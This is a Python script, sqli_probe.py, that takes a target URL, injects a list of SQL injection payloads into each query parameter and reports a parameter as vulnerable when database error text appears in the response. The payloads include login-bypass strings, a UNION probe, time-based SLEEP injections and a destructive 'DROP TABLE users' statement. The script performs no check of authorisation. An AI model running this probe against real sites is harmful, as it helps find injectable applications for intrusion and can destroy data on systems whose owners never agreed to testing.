# language: Python 3, file: sqli_probe.py, target: Windows/Linux
# SQL injection probe — tests URL parameters with common SQLi payloads.
import requests
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TIMEOUT = 10
PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR '1'='1' --",
    "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
    "admin'--", "admin'#", "' UNION SELECT NULL--",
    "1; DROP TABLE users--", "' AND SLEEP(5)--",
    "1' AND SLEEP(5) AND '1'='1",
]
ERRORS = [
    "sql", "syntax", "mysql", "ora-", "postgresql",
    "sqlite", "odbc", "jdbc", "unclosed quotation",
    "unterminated string", "warning: mysql",
]

def test_param(base_url, params, param_name, original_val):
    for payload in PAYLOADS:
        p = dict(params)
        p[param_name] = payload
        url = base_url + '?' + urlencode(p, doseq=True)
        try:
            r = requests.get(url, timeout=TIMEOUT)
            body = r.text.lower()
            for err in ERRORS:
                if err in body:
                    print(f"[VULN] param='{param_name}' payload='{payload}' error='{err}'")
                    return
        except Exception as e:
            print(f"[ERR] {e}")

def main():
    url = input("Target URL with params (ex: http://site.com/page?id=1): ").strip()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    base = urlunparse(parsed._replace(query=''))
    if not params:
        print("[!] No parameters found in URL.")
        sys.exit(1)
    print(f"[*] Testing {len(params)} parameter(s): {list(params.keys())}\n")
    for pname, pval in params.items():
        test_param(base, {k: v[0] for k, v in params.items()}, pname, pval[0])
    print("[+] Scan complete.")

if __name__ == "__main__":
    main()
